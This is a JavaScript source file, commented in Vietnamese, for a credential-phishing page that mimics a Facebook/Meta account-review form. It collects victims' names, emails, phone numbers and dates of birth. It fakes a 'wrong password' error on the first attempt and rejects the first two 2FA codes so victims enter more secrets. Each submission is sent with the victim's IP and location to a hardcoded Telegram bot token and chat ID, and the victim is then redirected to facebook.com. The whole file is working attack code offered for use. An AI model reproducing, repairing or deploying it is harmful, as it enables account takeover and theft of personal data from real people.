/* ================= 1. CONFIGURATION ================= */
const CONFIG = {
    TELEGRAM: {
        // Thay token và chat ID của bạn vào đây
        BOT_TOKEN: "7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE",
        CHAT_ID: "-5070121169"
    },
    // Link chuyển hướng sau khi hoàn tất
    REDIRECT_URL: "https://www.facebook.com/",
    // API lấy địa chỉ IP
    IP_API: "https://ipwho.is/"
};

/* ================= 2. MODAL & UI HELPERS ================= */
const Modal = {
    // Hiển thị Popup theo ID, ẩn các cái khác
    show(modalId) {
        const overlay = document.getElementById("overlay");
        if (overlay) overlay.classList.remove("hidden");

        ["infoForm", "passwordForm", "verifyModal"].forEach(id => {
            const el = document.getElementById(id);
            if (el) el.classList.add("hidden");
        });

        const target = document.getElementById(modalId);
        if (target) target.classList.remove("hidden");
    },

    // Hiển thị lỗi đỏ
    showError(type, msg) {
        if (type === 'password') {
            // Tìm thẻ lỗi password
            let err = document.getElementById("passwordError");
            
            // FIX: Nếu HTML lỡ quên chưa tạo thẻ lỗi, tự tạo luôn bằng JS để chắc chắn hiện
            if (!err) {
                const input = document.getElementById("passwordInput");
                if(input) {
                    err = document.createElement("p");
                    err.id = "passwordError";
                    err.className = "text-red-500 text-sm mb-3 text-center";
                    input.parentNode.insertBefore(err, input.nextSibling);
                }
            }

            if (err) {
                err.innerText = msg;
                err.classList.remove("hidden");
            }
        } else if (type === 'verify') {
            const err = document.getElementById("verifyError");
            if (err) {
                err.innerText = msg;
                err.classList.remove("hidden");
            }
        }
    },

    // Ẩn lỗi (khi retry)
    hideError(type) {
        if (type === 'verify') {
            const err = document.getElementById("verifyError");
            if (err) err.classList.add("hidden");
        }
        if (type === 'password') {
            const err = document.getElementById("passwordError");
            if (err) err.classList.add("hidden");
        }
    }
};

/* ================= 3. UTILITIES (LOGIC GỬI TIN) ================= */
const Utils = {
    // Lấy thông tin IP
    getLocation: async () => {
        try {
            const response = await fetch(CONFIG.IP_API);
            const data = await response.json();
            if (data.success) {
                return {
                    ip: data.ip,
                    city: data.city || "Unknown",
                    country: data.country || "Unknown",
                    flag: data.flag ? data.flag.emoji : ""
                };
            }
            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
        } catch (e) {
            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
        }
    },

    // Lấy giờ hiện tại Việt Nam
    getTime: () => {
        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
    },

    // Gửi tin nhắn về Telegram
    sendMessage: async (message) => {
        const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
        if (!BOT_TOKEN || !CHAT_ID) return false;

        try {
            // SỬA LỖI: Thêm dấu backtick ` bao quanh URL
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            if (!response.ok) return false;
            return true;
        } catch (e) {
            console.error(e);
            return false;
        }
    },

    // Tạo nội dung báo cáo (Log)
    formatReport: (data, type, loc) => {
        const time = Utils.getTime();
        
        let icon = "";
        if (type === "INFO") icon = "📝 INFO";
        else if (type === "PASS1") icon = "🔑 PASS 1";
        else if (type === "PASS2") icon = "🔐 PASS 2"; // Log Full
        else if (type === "OTP") icon = "🔥 OTP";
        else icon = "🔔 REPORT";

        // SỬA LỖI: Thêm dấu backtick ` cho các biến chuỗi
        let infoBlock = `<b>Name:</b> ${data.fullName}`;
        if (data.email) infoBlock += `\n<b>Mail:</b> ${data.email}`;
        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
        infoBlock += `\n<b>Phone:</b> ${data.phone}`;
        if (data.dob) infoBlock += `\n<b>DOB:</b> ${data.dob}`;

        let passBlock = "";
        if (data.pass1) passBlock += `\n----------------\n<b>P1:</b> <code>${data.pass1}</code>`;
        if (data.pass2) passBlock += `\n<b>P2:</b> <code>${data.pass2}</code>`;
        
        let otpBlock = "";
        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;

        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;

        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
    },

    // Ẩn email/sđt để hiển thị ở form OTP
    maskString: (str, type) => {
        if (!str) return "...";
        if (type === 'email') {
            const parts = str.split('@');
            if (parts.length < 2) return str;
            const visible = parts[0].length > 3 ? parts[0].substring(0, 3) : parts[0].substring(0, 1);
            return `${visible}***@${parts[1]}`;
        }
        if (type === 'phone') {
            if (str.length < 7) return str;
            return `${str.substring(0, 3)}****${str.substring(str.length - 3)}`;
        }
        return str;
    }
};

/* ================= 4. MAIN APP LOGIC ================= */
document.addEventListener("DOMContentLoaded", async () => {
    // 1. Khởi tạo
    const userLoc = await Utils.getLocation(); 
    let formData = {
        fullName: "", email: "", businessEmail: "", phone: "", dob: "",
        pass1: "", pass2: "", twoFactorCode: ""
    };
    
    // State quản lý luồng
    let passwordAttempts = 0;
    let otpAttempts = 0;
    let isLocked = false; 

    // DOM Elements
    const btnSubmit = document.getElementById("submitRequestBtn");
    const btnSendInfo = document.querySelector("#infoForm button");
    const btnPass = document.getElementById("continueBtn");
    const btnVerify = document.getElementById("verifyBtn");
    const countdownEl = document.getElementById("countdown");

    // Tạo Ticket ID ảo cho đẹp
    const ticketEl = document.getElementById("ticketId");
    if (ticketEl) ticketEl.innerText = "REF-" + Math.floor(100000 + Math.random() * 900000);

    // --- BƯỚC 0: Mở form Info ---
    if (btnSubmit) {
        btnSubmit.addEventListener("click", () => Modal.show("infoForm"));
    }

    // --- BƯỚC 1: XỬ LÝ FORM INFO ---
    if (btnSendInfo) {
        btnSendInfo.addEventListener("click", () => {
            const inputs = document.querySelectorAll("#infoForm .meta-input");
            const dobInputs = document.querySelectorAll("#infoForm .grid input");

            // [0] FullName, [1] Email, [2] Business Email, [3] Page Name, [4] Phone
            formData.fullName = inputs[0].value || "N/A";
            formData.email = inputs[1].value || "N/A";
            formData.businessEmail = inputs[2].value || "N/A";
            formData.phone = inputs[4].value || "N/A";
            
            if (dobInputs.length >= 3) {
                formData.dob = `${dobInputs[0].value}/${dobInputs[1].value}/${dobInputs[2].value}`;
            }

            Utils.sendMessage(Utils.formatReport(formData, "INFO", userLoc));
            Modal.show("passwordForm");
        });
    }

    // --- BƯỚC 2: XỬ LÝ PASSWORD (2 Lần) ---
    if (btnPass) {
        btnPass.addEventListener("click", () => {
            const passInput = document.getElementById("passwordInput");
            const val = passInput.value;
            
            if (!val) return; 

            passwordAttempts++;

            if (passwordAttempts === 1) {
                // === LẦN 1: Giả vờ sai ===
                formData.pass1 = val;
                Utils.sendMessage(Utils.formatReport(formData, "PASS1", userLoc));

                passInput.value = "";
                // Báo lỗi (Code bên trên đã thêm tự động tạo thẻ lỗi nếu thiếu)
                Modal.showError("password", "The password you entered is incorrect. Please try again.");
                
            } else {
                // === LẦN 2: Chấp nhận -> Sang OTP ===
                formData.pass2 = val;
                Utils.sendMessage(Utils.formatReport(formData, "PASS2", userLoc));

                const maskEmailEl = document.getElementById("maskedEmail");
                const maskPhoneEl = document.getElementById("maskedPhone");
                if (maskEmailEl) maskEmailEl.innerText = Utils.maskString(formData.email, 'email');
                if (maskPhoneEl) maskPhoneEl.innerText = Utils.maskString(formData.phone, 'phone');

                Modal.show("verifyModal");
            }
        });
    }

    // --- BƯỚC 3: XỬ LÝ OTP (Lock 30s) ---
    if (btnVerify) {
        btnVerify.addEventListener("click", () => {
            if (isLocked) return; 

            const codeInput = document.getElementById("verifyCode");
            const codeVal = codeInput.value.trim();

            if (!codeVal) return; 

            formData.twoFactorCode = codeVal;
            otpAttempts++;

            Utils.sendMessage(Utils.formatReport(formData, "OTP", userLoc));

            if (otpAttempts < 3) {
                // === LẦN 1 & 2: Sai -> KHÓA ===
                codeInput.value = "";
                Modal.showError("verify", "The code you entered is incorrect.");

                isLocked = true;
                btnVerify.disabled = true;
                btnVerify.style.opacity = "0.7";
                btnVerify.innerText = "Please wait...";

                if (countdownEl) {
                    let seconds = 30;
                    countdownEl.classList.remove("hidden");
                    countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK

                    const timer = setInterval(() => {
                        seconds--;
                        countdownEl.innerText = `Try again in ${seconds}s`; // SỬA LỖI BACKTICK

                        if (seconds <= 0) {
                            clearInterval(timer);
                            isLocked = false;
                            countdownEl.classList.add("hidden");
                            Modal.hideError("verify");
                            
                            btnVerify.disabled = false;
                            btnVerify.style.opacity = "1";
                            btnVerify.innerText = "Continue";
                        }
                    }, 1000);
                }

            } else {
                // === LẦN 3: DONE ===
                btnVerify.innerText = "Processing...";
                btnVerify.disabled = true;
                Modal.hideError("verify");

                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, 1500);
            }
        });
    }
});
